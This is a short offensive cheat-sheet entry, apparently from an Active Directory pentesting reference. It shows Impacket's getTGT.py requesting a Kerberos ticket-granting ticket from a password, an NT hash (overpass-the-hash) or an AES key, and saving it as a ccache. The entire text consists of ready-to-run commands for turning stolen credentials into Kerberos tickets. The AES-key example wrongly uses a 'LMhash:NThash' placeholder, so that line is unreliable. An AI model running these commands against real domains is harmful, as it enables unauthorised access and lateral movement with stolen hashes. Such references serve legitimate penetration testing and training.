Given a password, hash or aesKey, it will request a TGT and save it as ccache
```bash
# with a password
getTGT.py $DOMAIN/$USER:$PASSWORD@$TARGET

# with an NT hash (overpass-the-hash)
getTGT.py -hashes 'LMhash:NThash' $DOMAIN/$USER@$TARGET

# with an AES (128 or 256 bits) key
getTGT.py -aesKey 'LMhash:NThash' $DOMAIN/$USER@$TARGET
```